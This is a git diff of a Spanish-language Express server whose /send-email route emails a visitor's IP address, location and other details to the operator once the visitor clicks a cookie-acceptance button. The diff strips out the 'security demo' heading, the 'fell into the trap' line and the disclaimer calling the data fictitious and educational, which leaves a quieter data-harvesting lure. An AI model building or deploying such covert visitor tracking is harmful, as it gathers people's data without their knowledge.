@@ -60,11 +60,11 @@ app.post('/send-email', async (req, res) => {
     
     const emailContent = `
         <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
-            <h2 style="color: #d32f2f;">🎯 Cookie Aceptada - Demo de Seguridad</h2>
-            <p style="color: #4caf50; font-weight: bold;">¡Alguien ha caído en la trampa!</p>
+            <h2 style="color: #d32f2f;">Alguien acepto la cookie !</h2>
+            
             
             <div style="background: #f5f5f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
-                <h3 style="color: #333;">📊 Datos "Recolectados" (Ficticios):</h3>
+                <h3 style="color: #333;">Datos" (Ficticios):</h3>
                 <table style="width: 100%; border-collapse: collapse;">
                     <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>IP:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${ip}</td></tr>
                     <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Ubicación:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${location}</td></tr>
@@ -76,9 +76,6 @@ app.post('/send-email', async (req, res) => {
                 </table>
             </div>
             
-            <p style="color: #666; font-style: italic; font-size: 12px;">
-                Nota: Todos estos datos son ficticios y generados para demostración educativa.
-            </p>
         </div>
     `;
 
@@ -125,8 +122,6 @@ app.post('/send-email', async (req, res) => {
 });
 
 app.listen(PORT, () => {
-    console.log('🚀 Servidor corriendo en http://localhost:3000');
-    console.log('💡 Visita la página y haz clic en "Aceptar cookies"');
-    console.log('📧 Los emails llegarán a: agus.monetti01@gmail.com');
+    console.log('Servidor corriendo en http://localhost:3000');
     console.log('==========================================');
 });
